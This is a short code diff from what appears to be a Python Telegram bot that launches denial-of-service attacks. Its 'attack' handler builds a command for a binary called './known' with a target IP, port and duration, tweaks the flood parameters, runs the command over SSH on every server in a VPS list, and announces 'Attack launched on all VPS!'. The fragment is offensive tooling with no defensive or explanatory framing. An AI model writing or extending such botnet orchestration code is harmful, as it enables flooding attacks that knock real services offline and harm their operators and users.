@@ -100,7 +100,7 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     attack_in_progress = True
-    command = f"./known {ip} {port} {duration} 800 "
+    command = f"./known {ip} {port} {duration} 13 900 "
     results = [ssh_command(vps, command) for vps in VPS_LIST]
 
     await context.bot.send_message(chat_id=chat_id, text="*⚔️ Attack launched on all VPS! ⚔️*", parse_mode='Markdown')
